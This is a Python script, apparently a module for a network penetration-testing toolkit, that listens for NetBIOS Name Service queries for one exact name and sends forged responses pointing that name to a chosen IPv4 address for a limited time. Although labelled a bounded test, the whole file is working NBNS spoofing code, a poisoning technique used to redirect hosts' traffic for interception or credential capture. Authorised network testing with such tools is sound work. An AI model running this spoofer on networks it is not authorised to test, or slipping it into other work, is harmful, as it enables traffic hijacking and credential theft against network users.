#!/usr/bin/env python3
# @name: Bounded NBNS Response Test
# @desc: NetBIOS Name Service (NBNS) spoofing.
# @category: network
# @danger: true
# @active: true
# @web: true
# @inputs: [{"name":"name","label":"Exact NetBIOS name","type":"text","placeholder":"TESTHOST","required":true},{"name":"address","label":"Response IPv4 address","type":"text","required":true},{"name":"seconds","label":"Duration","type":"number","default":"30"}]

import ipaddress
import socket
import struct
import sys
from pathlib import Path
from scapy.all import IP, UDP, Raw, send, sniff
from payloads._web_input import request_input


def decode_name(encoded):
    if len(encoded) != 32 or any(not 65 <= value <= 80 for value in encoded):
        return ""
    return "".join(chr(((encoded[i] - 65) << 4) | (encoded[i + 1] - 65)) for i in range(0, 32, 2)).rstrip(" \x00").upper()


def encode_name(name):
    raw = name.ljust(15)[:15].encode() + b"\x00"
    return b"".join(bytes((65 + (value >> 4), 65 + (value & 15))) for value in raw)


def main() -> int:
    expected = (sys.argv[1] if len(sys.argv) > 1 else "").strip().upper()
    try:
        address = str(ipaddress.IPv4Address(sys.argv[2])); seconds = max(1, min(int(sys.argv[3]), 300))
    except (IndexError, ValueError):
        return 2
    if not expected or len(expected) > 15:
        print("NetBIOS name must contain 1–15 characters.")
        return 2
    interfaces = sorted(p.name for p in Path("/sys/class/net").iterdir() if p.name != "lo")
    interface = str(request_input("Select network interface", input_type="select", choices=interfaces))
    responses = 0

    def answer(packet):
        nonlocal responses
        if IP not in packet or UDP not in packet or packet[UDP].dport != 137:
            return
        data = bytes(packet[UDP].payload)
        if len(data) < 45 or data[12] != 32 or decode_name(data[13:45]) != expected:
            return
        txid = data[:2]
        encoded = b"\x20" + encode_name(expected) + b"\x00"
        payload = txid + struct.pack(">HHHHH", 0x8500, 0, 1, 0, 0) + encoded + struct.pack(">HHIH", 0x20, 1, 30, 6) + b"\x00\x00" + socket.inet_aton(address)
        send(IP(dst=packet[IP].src) / UDP(sport=137, dport=packet[UDP].sport) / Raw(payload), iface=interface, verbose=False)
        responses += 1
        print(f"Answered {expected} for {packet[IP].src} → {address}", flush=True)

    print(f"Testing exact name {expected} for {seconds} seconds…", flush=True)
    sniff(iface=interface, filter="udp port 137", prn=answer, store=False, timeout=seconds)
    print(f"Sent {responses} response(s).")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
